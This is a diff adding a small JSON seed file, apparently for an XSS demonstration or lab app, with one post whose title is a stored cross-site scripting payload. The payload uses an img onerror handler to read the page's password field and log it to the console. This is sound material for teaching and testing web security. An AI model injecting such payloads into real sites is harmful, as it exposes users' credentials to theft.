@@ -1,0 +1,8 @@
+{
+  "posts": [
+    {
+      "title": "Going to steal your password <img src=x onerror=\"document.getElementById('password-input').addEventListener('blur', function(e) {console.log('Your password is: ' + e.target.value)})\">",
+      "id": 1
+    }
+  ]
+}
